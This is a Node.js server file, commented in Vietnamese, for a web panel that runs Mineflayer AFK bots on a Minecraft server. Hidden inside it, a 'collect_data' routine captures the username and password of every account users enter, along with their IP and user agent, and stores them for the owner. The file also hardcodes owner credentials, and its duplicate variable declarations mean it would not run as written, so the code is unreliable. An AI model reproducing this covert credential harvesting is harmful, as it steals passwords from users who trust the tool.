const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH OWNER =====
const OWNER_IP = '1.53.131.94';
const OWNER_PASSWORD = 'OwnerZo2026';

// ===== DỮ LIỆU TOÀN CỤC =====
const clientData = {};
let globalCollectedData = [];
let isMaintenance = false;
let ownerSocketId = null;

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.log('⚠️ Lỗi đọc file data, tạo mới');
    }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
}

function saveData() {
    try {
        const data = {
            clientData: clientData,
            globalCollectedData: globalCollectedData,
            isMaintenance: isMaintenance
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log('❌ Lỗi lưu file:', e.message);
    }
}

const savedData = loadData();
let clientData = savedData.clientData || {};
let globalCollectedData = savedData.globalCollectedData || [];
let isMaintenance = savedData.isMaintenance || false;

app.use(express.static('public'));

app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isOwner, ip: clientIp });
});

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
        ownerSocketId = socket.id;
        console.log('👑 Owner đã kết nối!');
    }

    if (!clientData[clientIp]) {
        clientData[clientIp] = { accounts: [], bots: {} };
        saveData();
    }

    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    // ===== THU THẬP DỮ LIỆU =====
    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        
        // CHỈ OWNER MỚI THẤY LOG NÀY
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
        }
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        io.emit('sync_collected_data', globalCollectedData);
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
        }
    });

    // ===== BẢO TRÌ =====
    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    // ===== QUẢN LÝ ACCOUNTS =====
    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            saveData();
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    // ============================================================
    //  BOT MINEFLAYER - DÙNG CODE CỦA OWNER
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        const logSystem = (msg) => {
            socket.emit('log', `[${account.username}] ${msg}`);
        };

        let hasJoinedKingSMP = false;
        let hasExecutedAFK = false;
        let isLoggedIn = false;

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        logSystem(`🔄 Đang kết nối tới kingmc.vn...`);

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                logSystem(`🔑 Đang đăng nhập...`);
            });

            bot.on('spawn', () => {
                if (hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    if (!hasExecutedAFK) {
                        setTimeout(() => {
                            if (bot) {
                                logSystem(`💤 Gửi lệnh /afk...`);
                                bot.chat('/afk');
                            }
                        }, 4000);
                    }
                } else {
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    logSystem(`✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                logSystem(`${message}`);
                const msgLower = message.toLowerCase();

                if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                    setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
                } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                    setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 2000);
                }

                if (!hasJoinedKingSMP && !isLoggedIn && 
                    (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    isLoggedIn = true;
                    logSystem(`✅ Đã đăng nhập! Đợi 5s gõ /menu...`);
                    setTimeout(() => {
                        if (bot && !hasJoinedKingSMP) {
                            logSystem(`📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }
            });

            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                logSystem(`📂 Menu mở: ${rawTitle}`);

                if (!hasJoinedKingSMP) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) return;
                        logSystem(`🖱️ Click Slot 24 chọn KingSMP...`);
                        hasJoinedKingSMP = true;

                        bot.clickWindow(24, 0, 0)
                            .then(() => logSystem(`✅ Click Slot 24 thành công!`))
                            .catch(() => logSystem(`⚠️ Bỏ qua cảnh báo transaction của server`));

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 2500);
                } else if (hasJoinedKingSMP && !hasExecutedAFK) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) return;
                        logSystem(`🖱️ Click Slot 1 chọn AFK...`);
                        hasExecutedAFK = true;

                        bot.clickWindow(1, 0, 0)
                            .then(() => logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`))
                            .catch(() => logSystem(`⚠️ Bỏ qua cảnh báo transaction AFK`));

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 1500);
                }
            });

            bot.on('end', (reason) => {
                logSystem(`⚠️ Ngắt kết nối: ${reason || 'Mất kết nối từ Server'}`);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                delete clientData[clientIp].bots[id];
                saveData();

                if (account.autoReconnect) {
                    logSystem(`🔄 Tự động kết nối lại sau 5 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('start_bot', id);
                        }
                    }, 5000);
                }
            });

            bot.on('error', (err) => {
                logSystem(`❌ Lỗi Bot: ${err.message}`);
            });

        } catch (e) {
            logSystem(`❌ Lỗi khởi tạo: ${e.message}`);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (account) {
            account.status = 'STOPPED';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        saveData();
        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
        if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
            ownerSocketId = null;
            console.log('👑 Owner đã ngắt kết nối');
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Owner IP: ${OWNER_IP}`);
    console.log(`🔑 Owner Password: ${OWNER_PASSWORD}`);
    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
});
